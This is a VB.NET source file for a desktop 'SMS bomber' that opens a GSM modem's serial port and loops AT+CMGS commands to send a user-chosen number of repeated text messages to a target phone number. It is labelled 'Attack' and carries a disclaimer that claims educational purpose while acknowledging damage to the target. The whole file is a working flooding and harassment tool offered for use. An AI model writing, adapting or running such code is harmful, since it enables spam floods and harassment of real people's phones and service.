
' I SEE YOU REVERSE ENGINEERED MY CODE.. FEEL FREE TO COPY IT.








'headers
Imports System
Imports System.IO.Ports
Imports System.Threading



Public Class MainForm
    Dim NumberOfLoop As Integer




    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitButton.Click
        Try
            With SerialPort
                .PortName = PortsComboBox.Text
                .BaudRate = 9600
                .Parity = Parity.None
                .StopBits = StopBits.One
                .DataBits = 8
                .Handshake = Handshake.RequestToSend
                .DtrEnable = True
                .RtsEnable = True
                .NewLine = vbCrLf
                .Close()
            End With
        Catch ex As Exception

        End Try
        Close()
    End Sub

    Private Sub MainForm_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '  MsgBox("This is a sms bomber application for pc developed by (rex)godofping1111." & vbNewLine & vbNewLine & "Terms and Agreements" & vbNewLine & "I'm not responsible for any loss of your load or damage to your modem." & vbNewLine & "Make sure you are registered to an unlimited text promo before you use this application." & vbNewLine & "Click OK below to accepter the terms and agreements.", MsgBoxStyle.Exclamation, )
        Dim MessageString As String = "Disclaimer" & vbNewLine & vbNewLine & " This is a sms bomber application for pc developed by (rex)godofping1111." & vbNewLine & vbNewLine & "Terms and Agreements" & vbNewLine & "I'm not responsible for any loss of your load or the damages cause by this application to your modem and your target. For education purposes only." & vbNewLine & "Make sure you are registered to an unlimited text promo before you use this application." & vbNewLine & vbNewLine & "Click YES below to accept the terms and agreements. No to exit."
        Dim ButtonDialogResult As DialogResult = MessageBox.Show(MessageString, "Read me first!", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2)
        If ButtonDialogResult = Windows.Forms.DialogResult.No Then
            Me.Close()
        End If




        Try
            Dim ports As String() = SerialPort.GetPortNames
            Dim port As String

            For Each port In ports
                PortsComboBox.Items.Add(port)
            Next
            PortsComboBox.SelectedIndex = 0

        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub ConnectButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ConnectButton.Click
        Try
            With SerialPort
                .PortName = PortsComboBox.Text
                .BaudRate = 9600
                .Parity = Parity.None
                .StopBits = StopBits.One
                .DataBits = 8
                .Handshake = Handshake.RequestToSend
                .DtrEnable = True
                .RtsEnable = True
                .NewLine = vbCrLf
                .Open()
            End With

            Status.Text = "connected"
            Status.ForeColor = Color.Green

        Catch ex As Exception
            Status.Text = "disconnected"
            Status.ForeColor = Color.Red
            MsgBox("Wrong Port. Make sure your dashboard is close.", MsgBoxStyle.Critical)

        End Try
    End Sub

    Private Sub AttackButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AttackButton.Click

        NumberOfLoop = CInt(NumberOfAttacksTextBox.Text)
        Dim Counter As Integer = 0
        Dim sent As Integer = 0


        For index As Integer = 1 To NumberOfLoop
            Delay(0.6)
            Try
                If SerialPort.IsOpen Then
                    With SerialPort
                        .Write("AT" & vbCrLf)
                        .Write("AT+CMGF=1" & vbCrLf)
                        .Write("AT+CMGS=" & Chr(34) & TargetTextBox.Text & Chr(34) & vbCrLf)
                        .Write(MessageTextBox.Text & Chr(26))

                        Counter += 1
                        sent += 1



                        If Counter = 1 Then
                            MsgBox(NumberOfAttacksTextBox.Text & " message/s will be sent to " & TargetTextBox.Text & "!")
                        End If


                    End With
                Else

                End If
            Catch ex As Exception
                MsgBox("Wrong port selected. please change to correct port")
            End Try

            NumberOfSentTextBox.Text = sent.ToString

        Next



    End Sub

    Private Sub ClearButton_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ClearButton.Click
        TargetTextBox.Text = ""
        MessageTextBox.Text = ""
        NumberOfAttacksTextBox.Text = "1"
    End Sub
End Class



